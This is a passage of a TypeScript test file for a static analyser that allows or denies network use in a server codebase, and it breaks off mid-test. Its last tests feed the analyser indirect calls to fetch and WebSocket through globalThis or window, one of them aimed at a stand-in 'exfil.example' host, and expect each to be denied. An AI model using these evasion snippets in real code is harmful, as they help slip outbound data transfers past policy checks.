import { readFileSync } from 'node:fs';
import { join } from 'node:path';
import { fileURLToPath } from 'node:url';

import ts from 'typescript';
import { describe, expect, it } from 'vitest';

import {
  analyzeNetworkPolicy,
  analyzeNetworkPolicyTree,
  DEFAULT_FIXPOINT_CEILING,
  inspectNetworkPolicy,
  isValueRead,
  isWriteTarget,
  LOOPBACK_HOST,
  NETWORK_GLOBAL_NAMES,
  POLICY_KEY_NAMES,
  PORT_MAX,
  STATIC_KEY_CEILING,
  type NetworkPolicyOptions,
  type NetworkPolicyResult,
  type ReasonCode,
} from './support/d3-network-policy.js';
import {
  D3_REGRESSION_MATRIX,
  REAL_HOST_REPLICA,
  REGRESSION_CATEGORIES,
  reversePropagationChain,
  type RegressionRow,
} from './support/d3-regression-matrix.js';
import { EXPECTED_HOST_CLOSURE, readHostClosure } from './support/host-closure.js';

/**
 * Cockpit D3 network policy — mechanism tests and the semantic regression matrix.
 *
 * The detector under test is `tests/cockpit-host/support/d3-network-policy.ts`;
 * the rows live in `tests/cockpit-host/support/d3-regression-matrix.ts`. The
 * purity suite integrates the detector over the real host tree separately.
 */

const hostDir = fileURLToPath(new URL('../../src/cockpit-host/', import.meta.url));
const detectorPath = fileURLToPath(new URL('./support/d3-network-policy.ts', import.meta.url));

const NS = `import http from 'node:http';`;
const L = `(request: http.IncomingMessage, response: http.ServerResponse) => { response.end('ok'); }`;

const describeFindings = (result: NetworkPolicyResult): string =>
  result.findings.map((finding) => `${finding.reason}@${String(finding.line)}:${String(finding.column)} ${finding.text}`).join('; ');

/** Every node under `root` (depth-first) that satisfies `predicate`. */
function collectNodes<T extends ts.Node>(root: ts.Node, predicate: (node: ts.Node) => node is T): T[] {
  const found: T[] = [];
  const visit = (node: ts.Node): void => {
    if (predicate(node)) found.push(node);
    ts.forEachChild(node, visit);
  };
  visit(root);
  return found;
}

const identifiersNamed = (root: ts.Node, text: string): ts.Identifier[] =>
  collectNodes(root, ts.isIdentifier).filter((id) => id.text === text);

const occurrences = (haystack: string, needle: string): number => haystack.split(needle).length - 1;

// ---------------------------------------------------------------------------
// valueSymbolOf
// ---------------------------------------------------------------------------

describe('D3 network policy valueSymbolOf is the single symbol-resolution path', () => {
  it('resolves a shorthand property value to the local binding, not the property', () => {
    const inspection = inspectNetworkPolicy(`const server = 1;\nconst box = { server };`);
    const [declared, shorthand] = identifiersNamed(inspection.sourceFile, 'server');
    expect(declared).toBeDefined();
    expect(shorthand).toBeDefined();
    if (declared === undefined || shorthand === undefined) return;
    expect(ts.isShorthandPropertyAssignment(shorthand.parent)).toBe(true);
    const declaredSymbol = inspection.valueSymbolOf(declared);
    expect(inspection.valueSymbolOf(shorthand)).toBe(declaredSymbol);
    // The plain checker call returns the *property* symbol here — the mismatch F-3 named.
    expect(inspection.checker.getSymbolAtLocation(shorthand)).not.toBe(declaredSymbol);
  });

  it('resolves an export specifier to its local target', () => {
    const inspection = inspectNetworkPolicy(`const server = 1;\nexport { server as s };`);
    const [declared, local] = identifiersNamed(inspection.sourceFile, 'server');
    expect(declared).toBeDefined();
    expect(local).toBeDefined();
    if (declared === undefined || local === undefined) return;
    expect(ts.isExportSpecifier(local.parent)).toBe(true);
    expect(inspection.valueSymbolOf(local)).toBe(inspection.valueSymbolOf(declared));
    expect(inspection.valueSymbolOf(local.parent)).toBe(inspection.valueSymbolOf(declared));
  });

  it('resolves ordinary identifiers by binder identity across scopes', () => {
    const inspection = inspectNetworkPolicy(`const k = 1;\n{ const k = 2; k; }\nk;`);
    const [outerDecl, innerDecl, innerUse, outerUse] = identifiersNamed(inspection.sourceFile, 'k');
    expect(outerDecl && innerDecl && innerUse && outerUse).toBeTruthy();
    if (!outerDecl || !innerDecl || !innerUse || !outerUse) return;
    expect(inspection.valueSymbolOf(innerUse)).toBe(inspection.valueSymbolOf(innerDecl));
    expect(inspection.valueSymbolOf(outerUse)).toBe(inspection.valueSymbolOf(outerDecl));
    expect(inspection.valueSymbolOf(innerDecl)).not.toBe(inspection.valueSymbolOf(outerDecl));
  });

  it('is the only checker symbol-resolution path in the detector source', () => {
    const detector = readFileSync(detectorPath, 'utf8');
    expect(occurrences(detector, 'checker.getSymbolAtLocation(')).toBe(1);
    expect(occurrences(detector, 'checker.getShorthandAssignmentValueSymbol(')).toBe(1);
    expect(occurrences(detector, 'checker.getExportSpecifierLocalTargetSymbol(')).toBe(2);
    expect(occurrences(detector, 'getSymbolsInScope')).toBe(0);
    expect(occurrences(detector, 'getAliasedSymbol')).toBe(0);
    expect(occurrences(detector, 'getTypeAtLocation')).toBe(0);
  });
});

// ---------------------------------------------------------------------------
// isValueRead
// ---------------------------------------------------------------------------

describe('D3 network policy isValueRead separates runtime reads from names and types', () => {
  const source = `
import http, { type Server as S, createServer } from 'node:http';
import * as ns from 'node:url';
type T = { server: number; m(): void };
interface I { server: number }
enum E { server }
namespace N { export const server = 1; }
class C { server = 1; get g() { return 1; } set g(v: number) {} m() {} }
function server(server: number, { server: alias }: { server: number }): http.Server | null { return null; }
const o = { server: 1, [String(1)]: 2 };
let v: typeof server;
label: for (;;) { break label; }
server(o.server, { server: 1 });
const { server: renamed } = o;
export { renamed as server };
import.meta;
`;
  const inspection = inspectNetworkPolicy(source);
  const reads = identifiersNamed(inspection.sourceFile, 'server').filter(isValueRead);

  it('treats exactly the runtime reads as value reads', () => {
    const texts = reads.map((id) => {
      const parent = id.parent;
      return ts.SyntaxKind[parent.kind];
    });
    expect(texts).toEqual(['CallExpression']);
    // `export { renamed as server }`: the local name `renamed` is the value read, the exported name is not.
    const renamed = identifiersNamed(inspection.sourceFile, 'renamed').filter(isValueRead);
    expect(renamed.map((id) => ts.SyntaxKind[id.parent.kind])).toEqual(['ExportSpecifier']);
  });

  it('excludes declaration names, keys, member names, type positions, labels and import forms', () => {
    const excluded = identifiersNamed(inspection.sourceFile, 'server').filter((id) => !isValueRead(id));
    const kinds = new Set(excluded.map((id) => ts.SyntaxKind[id.parent.kind]));
    for (const kind of [
      'PropertySignature',
      'EnumMember',
      'VariableDeclaration',
      'PropertyDeclaration',
      'FunctionDeclaration',
      'Parameter',
      'BindingElement',
      'PropertyAssignment',
      'PropertyAccessExpression',
      'TypeQuery',
    ]) {
      expect(kinds, kind).toContain(kind);
    }
    expect(identifiersNamed(inspection.sourceFile, 'label').some(isValueRead)).toBe(false);
    expect(identifiersNamed(inspection.sourceFile, 'S').some(isValueRead)).toBe(false);
    expect(identifiersNamed(inspection.sourceFile, 'ns').some(isValueRead)).toBe(false);
    expect(identifiersNamed(inspection.sourceFile, 'meta').some(isValueRead)).toBe(false);
  });

  it('treats a class extends expression as a value read but implements as a type', () => {
    const inspected = inspectNetworkPolicy(`class A {}\ninterface I {}\nclass B extends A implements I {}`);
    expect(identifiersNamed(inspected.sourceFile, 'A').filter(isValueRead)).toHaveLength(1);
    expect(identifiersNamed(inspected.sourceFile, 'I').filter(isValueRead)).toHaveLength(0);
  });
});

// ---------------------------------------------------------------------------
// Static-key resolver
// ---------------------------------------------------------------------------

describe('D3 network policy static-key resolver returns exactly RESOLVED/NOT_CAPABILITY/INDETERMINATE', () => {
  const firstElementKey = (source: string): ReturnType<ReturnType<typeof inspectNetworkPolicy>['resolveStaticKey']> => {
    const inspection = inspectNetworkPolicy(source);
    const [access] = collectNodes(inspection.sourceFile, ts.isElementAccessExpression);
    expect(access).toBeDefined();
    if (access === undefined) throw new Error('no element access');
    return inspection.resolveStaticKey(access.argumentExpression);
  };

  it('resolves literals, templates, concatenations, unique consts and wrappers', () => {
    expect(firstElementKey(`o['listen'];`)).toEqual({ kind: 'RESOLVED', value: 'listen' });
    expect(firstElementKey(`o[\`listen\`];`)).toEqual({ kind: 'RESOLVED', value: 'listen' });
    expect(firstElementKey(`const A = 'lis'; o[\`\${A}ten\`];`)).toEqual({ kind: 'RESOLVED', value: 'listen' });
    expect(firstElementKey(`o['lis' + 'ten'];`)).toEqual({ kind: 'RESOLVED', value: 'listen' });
    expect(firstElementKey(`const K = 'listen'; o[K];`)).toEqual({ kind: 'RESOLVED', value: 'listen' });
    expect(firstElementKey(`const A = 'lis'; const B = A + 'ten'; o[((B as string)!) satisfies string];`)).toEqual({
      kind: 'RESOLVED',
      value: 'listen',
    });
    expect(firstElementKey(`o[0];`)).toEqual({ kind: 'RESOLVED', value: '0' });
  });

  it('returns NOT_CAPABILITY once a folded string exceeds the policy-name ceiling', () => {
    expect(STATIC_KEY_CEILING).toBe(Math.max(...POLICY_KEY_NAMES.map((name) => name.length)));
    expect(STATIC_KEY_CEILING).toBe('createServer'.length);
    expect(firstElementKey(`o['${'x'.repeat(STATIC_KEY_CEILING + 1)}'];`)).toEqual({ kind: 'NOT_CAPABILITY' });
    expect(firstElementKey(`o['${'x'.repeat(STATIC_KEY_CEILING)}'];`).kind).toBe('RESOLVED');
    expect(firstElementKey(`const A = '${'x'.repeat(STATIC_KEY_CEILING)}'; o[A + 'y'];`)).toEqual({ kind: 'NOT_CAPABILITY' });
  });

  it('returns INDETERMINATE for let, written const, parameters, cycles, calls and destructured bindings', () => {
    expect(firstElementKey(`let K = 'listen'; o[K];`)).toEqual({ kind: 'INDETERMINATE' });
    expect(firstElementKey(`const K = 'listen'; (K as any) = 'x'; o[K];`)).toEqual({ kind: 'INDETERMINATE' });
    expect(firstElementKey(`function f(K: string) { o[K]; }`)).toEqual({ kind: 'INDETERMINATE' });
    expect(firstElementKey(`const A: string = B; const B: string = A; o[A];`)).toEqual({ kind: 'INDETERMINATE' });
    expect(firstElementKey(`o[String(1)];`)).toEqual({ kind: 'INDETERMINATE' });
    expect(firstElementKey(`const { K } = { K: 'listen' }; o[K];`)).toEqual({ kind: 'INDETERMINATE' });
    expect(firstElementKey(`declare const K: string; o[K];`)).toEqual({ kind: 'INDETERMINATE' });
    expect(firstElementKey(`const K = 'lis' + Math.random(); o[K];`)).toEqual({ kind: 'INDETERMINATE' });
  });

  it('is scope-sensitive by binder identity, not by name', () => {
    expect(firstElementKey(`const K = 'request'; { const K = 'listen'; o[K]; }`)).toEqual({ kind: 'RESOLVED', value: 'listen' });
    expect(firstElementKey(`const K = 'listen'; function f(K: string) { o[K]; }`)).toEqual({ kind: 'INDETERMINATE' });
  });

  it('terminates on a long const chain and a dense concatenation tree', () => {
    const chain = Array.from({ length: 300 }, (_, i) => `const k${String(i + 1)} = k${String(i)};`).join('\n');
    const key = firstElementKey(`const k0 = 'listen';\n${chain}\no[k300];`);
    expect(['RESOLVED', 'INDETERMINATE']).toContain(key.kind);
    const tree = Array.from({ length: 2_000 }, () => `'x'`).join(' + ');
    expect(firstElementKey(`o[${tree}];`).kind).not.toBe('RESOLVED');
  });

  it('is the only key resolver in the detector source', () => {
    const detector = readFileSync(detectorPath, 'utf8');
    expect(occurrences(detector, 'function resolveKeyInner(')).toBe(1);
    expect(occurrences(detector, 'const resolveStaticKey = ')).toBe(1);
    expect(occurrences(detector, 'STATIC_KEY_CEILING')).toBeGreaterThan(0);
    expect(occurrences(detector, 'staticStringOf')).toBe(0);
    expect(occurrences(detector, 'collectStringConsts')).toBe(0);
  });
});

// ---------------------------------------------------------------------------
// Write inventory
// ---------------------------------------------------------------------------

describe('D3 network policy write inventory counts binder-resolved writes once', () => {
  const inspection = inspectNetworkPolicy(`
function f() {}
let g = 1;
(f as any) = 1;
(f as any) += 1;
(f as any)++;
--(f as any);
[(f as any)] = [1];
({ f } = { f: 1 } as any);
({ x: (f as any) } = { x: 1 } as any);
for (f as any in {}) {}
for (f as any of []) {}
const h = f;
f;
g = 2;
`);
  const symbolOf = (text: string): ts.Symbol => {
    const [id] = identifiersNamed(inspection.sourceFile, text);
    const symbol = id === undefined ? undefined : inspection.valueSymbolOf(id);
    if (symbol === undefined) throw new Error(`no symbol for ${text}`);
    return symbol;
  };

  it('counts assignment, compound, update, destructuring-assignment, for-in and for-of targets through wrappers', () => {
    expect(inspection.writeCountOf(symbolOf('f'))).toBe(9);
    expect(inspection.writeCountOf(symbolOf('g'))).toBe(1);
    expect(inspection.writeCountOf(symbolOf('h'))).toBe(0);
  });

  it('exposes isWriteTarget for member accesses inside patterns', () => {
    const inspected = inspectNetworkPolicy(`declare const o: any;\n[o.a] = [1];\n({ b: o.c } = {} as any);\no.d;\nuse([o.e]);`);
    const accesses = collectNodes(inspected.sourceFile, ts.isPropertyAccessExpression);
    expect(accesses.map((access) => isWriteTarget(access))).toEqual([true, true, false, false]);
  });
});

// ---------------------------------------------------------------------------
// Listener boundary
// ---------------------------------------------------------------------------

describe('D3 network policy createServer listener boundary', () => {
  const factsOfParameter = (source: string, name: string): readonly string[] => {
    const inspection = inspectNetworkPolicy(source);
    const parameter = collectNodes(inspection.sourceFile, ts.isParameter).find((p) => ts.isIdentifier(p.name) && p.name.text === name);
    const symbol = parameter === undefined ? undefined : inspection.valueSymbolOf(parameter.name);
    if (symbol === undefined) throw new Error(`no parameter ${name}`);
    return inspection.factsOf(symbol);
  };

  it('roots exactly parameter 0 as REQUEST and parameter 1 as RESPONSE', () => {
    const source = `${NS}\nhttp.createServer((a, b, c, d) => { a; b; c; d; });`;
    expect(factsOfParameter(source, 'a')).toEqual(['REQUEST:ROOT']);
    expect(factsOfParameter(source, 'b')).toEqual(['RESPONSE:ROOT']);
    expect(factsOfParameter(source, 'c')).toEqual([]);
    expect(factsOfParameter(source, 'd')).toEqual([]);
  });

  it('leaves parameters at index >= 2 unprivileged even when they misbehave', () => {
    const result = analyzeNetworkPolicy(`${NS}\nhttp.createServer((request, response, extra: any) => { extra.socket.write('x'); response.end(); });`);
    expect(result.verdict, describeFindings(result)).toBe('ALLOW');
  });

  it('requires a CallExpression with exactly one normalized function argument', () => {
    for (const [source, reason] of [
      [`${NS}\nhttp.createServer();`, 'CREATE_SERVER_ARITY'],
      [`${NS}\nhttp.createServer({}, ${L});`, 'CREATE_SERVER_ARITY'],
      [`${NS}\nnew http.createServer(${L});`, 'CREATE_SERVER_NEW'],
      [`${NS}\nlet h = ${L};\nhttp.createServer(h);`, 'LISTENER_NOT_FUNCTION'],
      [`${NS}\nhttp.createServer(({ url }, response) => {});`, 'LISTENER_PARAMETER_PATTERN'],
      [`${NS}\nhttp.createServer((...args: any[]) => {});`, 'LISTENER_PARAMETER_PATTERN'],
      [`${NS}\nhttp.createServer(function (this: unknown, request, response) {});`, 'LISTENER_THIS_PARAMETER'],
    ] as const) {
      const result = analyzeNetworkPolicy(source);
      expect(result.verdict, source).toBe('DENY');
      expect(result.reasons, source).toContain(reason);
    }
  });

  it('normalizes the listener through wrappers, const spines and unique FunctionDeclarations', () => {
    for (const source of [
      `${NS}\nhttp.createServer((${L}) as any);`,
      `${NS}\nconst h1 = ${L};\nconst h2 = h1!;\nhttp.createServer(h2);`,
      `${NS}\nfunction handle(request: http.IncomingMessage, response: http.ServerResponse) { response.end(\`\${request.url}\`); }\nhttp.createServer(handle);`,
    ]) {
      const result = analyzeNetworkPolicy(source);
      expect(result.verdict, `${source}\n${describeFindings(result)}`).toBe('ALLOW');
    }
  });

  it('roots the parameters of a FunctionDeclaration listener', () => {
    const source = `${NS}\nfunction handle(q: http.IncomingMessage, s: http.ServerResponse) { s.end(q.url); }\nhttp.createServer(handle);`;
    expect(factsOfParameter(source, 'q')).toEqual(['REQUEST:ROOT']);
    expect(factsOfParameter(source, 's')).toEqual(['RESPONSE:ROOT']);
  });
});

// ---------------------------------------------------------------------------
// Options argument
// ---------------------------------------------------------------------------

describe('D3 network policy denies every createServer options form (frozen: OPTIONS = DENY)', () => {
  it('denies a second argument regardless of its shape', () => {
    for (const options of ['{}', '{ IncomingMessage: class {} }', '{ ServerResponse: class {} }', '{ shouldUpgradeCallback: () => true }', 'undefined', 'opts']) {
      const result = analyzeNetworkPolicy(`${NS}\ndeclare const opts: any;\nhttp.createServer(${options}, ${L});`);
      expect(result.reasons, options).toContain('CREATE_SERVER_ARITY');
    }
  });

  it('performs no options analysis: the detector names no option keys', () => {
    const detector = readFileSync(detectorPath, 'utf8');
    for (const forbidden of ['IncomingMessage', 'ServerResponse', 'shouldUpgradeCallback', 'prototype']) {
      expect(occurrences(detector, forbidden), forbidden).toBe(0);
    }
  });
});

// ---------------------------------------------------------------------------
// Local callee eligibility and propagation
// ---------------------------------------------------------------------------

describe('D3 network policy local callee eligibility governs propagation and escape alike', () => {
  const factsOfParameter = (source: string, name: string): readonly string[] => {
    const inspection = inspectNetworkPolicy(source);
    const parameter = collectNodes(inspection.sourceFile, ts.isParameter).find((p) => ts.isIdentifier(p.name) && p.name.text === name);
    const symbol = parameter === undefined ? undefined : inspection.valueSymbolOf(parameter.name);
    if (symbol === undefined) throw new Error(`no parameter ${name}`);
    return inspection.factsOf(symbol);
  };

  it('propagates into an immutable FunctionDeclaration parameter as PARAM', () => {
    const source = `${NS}\nfunction f(res: http.ServerResponse) { res.end(); }\nhttp.createServer((request, response) => { f(response); });`;
    expect(factsOfParameter(source, 'res')).toEqual(['RESPONSE:PARAM']);
    expect(analyzeNetworkPolicy(source).verdict).toBe('ALLOW');
  });

  it('rejects a written FunctionDeclaration as a propagation callee and denies the call site', () => {
    const source = `${NS}\nfunction f(res: http.ServerResponse) { res.end(); }\n(f as any) = null;\nhttp.createServer((request, response) => { f(response); });`;
    expect(factsOfParameter(source, 'res')).toEqual([]);
    const result = analyzeNetworkPolicy(source);
    expect(result.reasons).toContain('RESPONSE_ESCAPE');
  });

  it('rejects rest, pattern and missing parameters for a privileged argument', () => {
    for (const callee of ['function f(...a: unknown[]) {}', 'function f({ x }: any) {}', 'function f() {}']) {
      const result = analyzeNetworkPolicy(`${NS}\n${callee}\nhttp.createServer((request, response) => { f(response); });`);
      expect(result.reasons, callee).toContain('RESPONSE_ESCAPE');
    }
  });

  it('uses one predicate: no fact is ever produced for a call site that is denied as an escape', () => {
    const inspection = inspectNetworkPolicy(
      `${NS}\nlet f = (res: any) => { res; };\nfunction g(res: any) { res; }\nhttp.createServer((request, response) => { f(response); g(response); });`,
    );
    const parameters = collectNodes(inspection.sourceFile, ts.isParameter).filter((p) => ts.isIdentifier(p.name) && p.name.text === 'res');
    const facts = parameters.map((p) => {
      const symbol = inspection.valueSymbolOf(p.name);
      return symbol === undefined ? [] : inspection.factsOf(symbol);
    });
    expect(facts).toEqual([[], ['RESPONSE:PARAM']]);
    expect(inspection.result.findings.filter((finding) => finding.reason === 'RESPONSE_ESCAPE')).toHaveLength(1);
  });

  it('is the only parameter-propagation predicate in the detector source', () => {
    const detector = readFileSync(detectorPath, 'utf8');
    expect(occurrences(detector, 'function resolvePropagationParameter(')).toBe(1);
    expect(occurrences(detector, 'resolvePropagationParameter(ctx, ')).toBe(2);
  });
});

// ---------------------------------------------------------------------------
// Factory confinement
// ---------------------------------------------------------------------------

describe('D3 network policy factory confinement', () => {
  const factoryState = (source: string, name: string): { confined: boolean; result: NetworkPolicyResult } => {
    const inspection = inspectNetworkPolicy(source);
    const [id] = identifiersNamed(inspection.sourceFile, name);
    const symbol = id === undefined ? undefined : inspection.valueSymbolOf(id);
    if (symbol === undefined) throw new Error(`no binding ${name}`);
    return { confined: inspection.isConfinedFactory(symbol), result: inspection.result };
  };

  it('confines the real exported factory and roots its const consumer as SERVER', () => {
    const source = `${NS}\nexport function createCockpitServer(): http.Server { return http.createServer(${L}); }\nconst server = createCockpitServer();\nserver.listen(4317, '127.0.0.1');`;
    const { confined, result } = factoryState(source, 'createCockpitServer');
    expect(confined).toBe(true);
    expect(result.verdict, describeFindings(result)).toBe('ALLOW');
    const inspection = inspectNetworkPolicy(source);
    const [serverDecl] = identifiersNamed(inspection.sourceFile, 'server');
    const serverSymbol = serverDecl === undefined ? undefined : inspection.valueSymbolOf(serverDecl);
    expect(serverSymbol && inspection.factsOf(serverSymbol)).toEqual(['SERVER:ROOT']);
  });

  it('does not confine mixed returns, escaped identities, async/generator or IIFE/method/object-held functions', () => {
    for (const [source, name] of [
      [`${NS}\nfunction make(x: boolean) { if (x) return http.createServer(${L}); return null; }`, 'make'],
      [`${NS}\nfunction make() { return http.createServer(${L}); }\nconst fns = [make];`, 'make'],
      [`${NS}\nfunction make() { return http.createServer(${L}); }\nmake.call(null);`, 'make'],
      [`${NS}\nasync function make() { return http.createServer(${L}); }`, 'make'],
      [`${NS}\nfunction* make() { return http.createServer(${L}); }`, 'make'],
      [`${NS}\nconst host = { make: () => http.createServer(${L}) };`, 'make'],
      [`${NS}\nfunction id(s: http.Server) { return s; }`, 'id'],
    ] as const) {
      const { confined, result } = factoryState(source, name);
      expect(confined, source).toBe(false);
      if (source.includes('createServer(')) expect(result.reasons, source).toContain('SERVER_UNCONFINED_RETURN');
    }
  });

  it('does not confine a factory whose return is a PARAM-derived server alias', () => {
    const { confined, result } = factoryState(`${NS}\nconst server = http.createServer(${L});\nfunction id(s: http.Server) { const t = s; return t; }\nid(server);`, 'id');
    expect(confined).toBe(false);
    expect(result.reasons).toContain('SERVER_UNCONFINED_RETURN');
  });

  it('confines factories returning other confined factories or rooted const aliases', () => {
    const source = `${NS}\nconst server = http.createServer(${L});\nfunction get() { return server; }\nfunction outer() { return get(); }\nouter().listen(4317, '127.0.0.1');`;
    expect(factoryState(source, 'get').confined).toBe(true);
    expect(factoryState(source, 'outer').confined).toBe(true);
    expect(factoryState(source, 'outer').result.verdict).toBe('ALLOW');
  });

  it('has no function-level factory set outside the fixpoint', () => {
    const detector = readFileSync(detectorPath, 'utf8');
    expect(occurrences(detector, 'serverFactories')).toBe(0);
    expect(occurrences(detector, 'function isConfinedFactory(')).toBe(1);
  });
});

// ---------------------------------------------------------------------------
// Positive policies
// ---------------------------------------------------------------------------

describe('D3 network policy positive policies deny every non-allow-listed operation', () => {
  it('denies destructuring of any proven target', () => {
    for (const [source, reason] of [
      [`${NS}\nconst { listen } = http.createServer(${L});`, 'SERVER_DESTRUCTURING'],
      [`${NS}\nhttp.createServer((request, response) => { const { socket } = request; });`, 'REQUEST_DESTRUCTURING'],
      [`${NS}\nhttp.createServer((request, response) => { const [a] = response as any; });`, 'RESPONSE_DESTRUCTURING'],
      [`${NS}\nhttp.createServer((request, response) => { let s; ({ socket: s } = response); });`, 'RESPONSE_DESTRUCTURING'],
    ] as const) {
      expect(analyzeNetworkPolicy(source).reasons, source).toContain(reason);
    }
  });

  it('denies export { server } and every other proven-target export', () => {
    const base = `${NS}\nconst server = http.createServer(${L});\n`;
    for (const tail of [`export { server };`, `export { server as s };`, `export default server;`, `const a = server;\nexport { a };`]) {
      expect(analyzeNetworkPolicy(base + tail).reasons, tail).toContain('SERVER_EXPORT');
    }
    expect(analyzeNetworkPolicy(`${NS}\nexport const server = http.createServer(${L});`).reasons).toContain('SERVER_EXPORT');
  });

  it('has no dangerous-member-name model: the allow-lists are the only member tables', () => {
    const detector = readFileSync(detectorPath, 'utf8');
    for (const legacy of [
      'reqResSymbols',
      'receiverIsReqRes',
      'STATIC_SOCKET_ACQUISITION_NAMES',
      'RECEIVER_INDEPENDENT_ASSIGNMENT_NAMES',
      'META_MUTATION_APIS',
      'scanReqResBindingPattern',
      'scanReqResAssignmentTarget',
      'scanSocketAssignmentTarget',
      "'socket'",
      "'connection'",
    ]) {
      expect(occurrences(detector, legacy), legacy).toBe(0);
    }
  });
});

// ---------------------------------------------------------------------------
// Fixpoint
// ---------------------------------------------------------------------------

describe('D3 network policy fixpoint is explicit, bounded and fail-closed', () => {
  it('converges on the real host replica and reports iterations within the derived bound', () => {
    const inspection = inspectNetworkPolicy(REAL_HOST_REPLICA);
    expect(inspection.result.fixpoint.state).toBe('CONVERGED');
    expect(inspection.result.fixpoint.iterations).toBeLessThanOrEqual(inspection.fixpointBound);
    expect(inspection.result.fixpoint.bound).toBe(inspection.fixpointBound);
    expect(inspection.fixpointBound).toBeGreaterThanOrEqual(inspection.declaredSymbolCount * 9 + 1);
    expect(inspection.fixpointBound).toBeLessThanOrEqual(DEFAULT_FIXPOINT_CEILING);
  });

  it('needs more passes for a longer reverse chain and converges monotonically', () => {
    const short = analyzeNetworkPolicy(reversePropagationChain(2));
    const long = analyzeNetworkPolicy(reversePropagationChain(8));
    expect(short.fixpoint.state).toBe('CONVERGED');
    expect(long.fixpoint.state).toBe('CONVERGED');
    expect(long.fixpoint.iterations).toBeGreaterThan(short.fixpoint.iterations);
    expect(long.verdict, describeFindings(long)).toBe('ALLOW');
  });

  it('reports EXHAUSTED and denies immediately when the ceiling is reached, without Phase-B findings', () => {
    const result = analyzeNetworkPolicy(reversePropagationChain(8), { fixpointCeiling: 3 });
    expect(result.fixpoint).toEqual({ state: 'EXHAUSTED', iterations: 3, bound: 3 });
    expect(result.verdict).toBe('DENY');
    expect(result.reasons).toEqual(['FIXPOINT_EXHAUSTED']);
  });

  it('exhaustion denies a source that is otherwise allowed and never masks it as ALLOW', () => {
    const allowed = analyzeNetworkPolicy(REAL_HOST_REPLICA);
    const exhausted = analyzeNetworkPolicy(REAL_HOST_REPLICA, { fixpointCeiling: 1 });
    expect(allowed.verdict).toBe('ALLOW');
    expect(exhausted.verdict).toBe('DENY');
    expect(exhausted.fixpoint.state).toBe('EXHAUSTED');
  });

  it('is the only fixpoint and the only provenance producer in the detector source', () => {
    const detector = readFileSync(detectorPath, 'utf8');
    expect(occurrences(detector, 'function runFixpoint(')).toBe(1);
    expect(occurrences(detector, 'function addFact(')).toBe(1);
    expect(occurrences(detector, 'ctx.facts.set(')).toBe(1);
    expect(occurrences(detector, 'facts.add(')).toBe(1);
    expect(occurrences(detector, "'CONVERGED'")).toBeGreaterThan(0);
    expect(occurrences(detector, "'EXHAUSTED'")).toBeGreaterThan(0);
  });
});

// ---------------------------------------------------------------------------
// Receiver-call result authority inheritance (PR #67 F2 / F3)
// ---------------------------------------------------------------------------

describe('D3 network policy receiver-call result authority inheritance (PR #67 F2/F3)', () => {
  const withServer = (rest: string): string => `${NS}\nconst server = http.createServer(${L});\n${rest}`;
  const inListener = (body: string): string => `${NS}\nhttp.createServer((request, response) => {\n  ${body}\n});`;

  const factsOfConst = (source: string, name: string): { facts: readonly string[]; result: NetworkPolicyResult; bound: number } => {
    const inspection = inspectNetworkPolicy(source);
    const declaration = collectNodes(inspection.sourceFile, ts.isVariableDeclaration).find((d) => ts.isIdentifier(d.name) && d.name.text === name);
    const symbol = declaration === undefined ? undefined : inspection.valueSymbolOf(declaration.name);
    if (symbol === undefined) throw new Error(`no const ${name}`);
    return { facts: inspection.factsOf(symbol), result: inspection.result, bound: inspection.fixpointBound };
  };

  it('F2: denies every proven-target call-result witness through the existing target policy', () => {
    for (const [source, reason] of [
      [withServer(`export const leaked = server.listen(4317, '127.0.0.1');`), 'SERVER_EXPORT'],
      [withServer(`server.listen(4317, '127.0.0.1').on('connection', (socket) => { socket.write('x'); });`), 'SERVER_MEMBER'],
      [withServer(`server.close().on('close', () => {});`), 'SERVER_MEMBER'],
      [inListener(`response.setHeader('a', 'b').socket;`), 'RESPONSE_MEMBER'],
      [inListener(`response.end('x').socket;`), 'RESPONSE_MEMBER'],
      [inListener(`const r2 = response.setHeader('a', 'b');\nuse(r2);`), 'RESPONSE_ESCAPE'],
      [withServer(`use(server.listen(4317, '127.0.0.1'));`), 'SERVER_ESCAPE'],
      [`${NS}\nhttp.createServer(${L}).listen(4317, '127.0.0.1').on('x', () => {});`, 'SERVER_MEMBER'],
      [withServer(`const leaked = server.listen(4317, '127.0.0.1');\nuse(leaked);`), 'SERVER_ESCAPE'],
    ] as const) {
      const result = analyzeNetworkPolicy(source);
      expect(result.verdict, source).toBe('DENY');
      expect(result.reasons, `${source}\n${describeFindings(result)}`).toEqual([reason]);
      expect(result.fixpoint.state, source).toBe('CONVERGED');
    }
  });

  it('F3: denies every invocation of a permitted global member at the call; its result is never followed', () => {
    for (const [source, reason] of [
      [`globalThis.valueOf().fetch('https://exfil.example/');`, 'GLOBAL_RECEIVER_CALL'],
      [`globalThis.global.valueOf().fetch('https://exfil.example/');`, 'GLOBAL_RECEIVER_CALL'],
      [`const g = globalThis.valueOf();`, 'GLOBAL_RECEIVER_CALL'],
      [`window['valueOf']().WebSocket;`, 'GLOBAL_RECEIVER_CALL'],
      [`use(self.valueOf());`, 'GLOBAL_RECEIVER_CALL'],
    ] as const) {
      const result = analyzeNetworkPolicy(source);
      expect(result.verdict, source).toBe('DENY');
      expect(result.reasons, `${source}\n${describeFindings(result)}`).toEqual([reason]);
    }
  });

  it('F3: denies optional invocations of permitted global members exactly like plain ones, with one finding each', () => {
    for (const [source, reason] of [
      [`globalThis.valueOf?.().fetch('x');`, 'GLOBAL_RECEIVER_CALL'],
      [`globalThis?.valueOf?.().fetch('x');`, 'GLOBAL_RECEIVER_CALL'],
      [`globalThis?.valueOf().fetch('x');`, 'GLOBAL_RECEIVER_CALL'],
      [`globalThis['valueOf']?.().fetch('x');`, 'GLOBAL_RECEIVER_CALL'],
      [`globalThis['valueOf']?.().WebSocket;`, 'GLOBAL_RECEIVER_CALL'],
      [`(globalThis.valueOf?.() as any).fetch('x');`, 'GLOBAL_RECEIVER_CALL'],
      [`globalThis.valueOf?.().self.fetch('x');`, 'GLOBAL_RECEIVER_CALL'],
      [`const g = globalThis.valueOf?.();`, 'GLOBAL_RECEIVER_CALL'],
      [`use(globalThis.valueOf?.());`, 'GLOBAL_RECEIVER_CALL'],
      [`function g() { return window.valueOf?.(); }`, 'GLOBAL_RECEIVER_CALL'],
      [`declare const k: string;\nglobalThis.valueOf?.()[k];`, 'GLOBAL_RECEIVER_CALL'],
      [`declare const k: string;\nglobalThis[k]?.().fetch('x');`, 'GLOBAL_RECEIVER_RUNTIME_KEY'],
    ] as const) {
      const result = analyzeNetworkPolicy(source);
      expect(result.verdict, source).toBe('DENY');
      expect(result.reasons, `${source}\n${describeFindings(result)}`).toEqual([reason]);
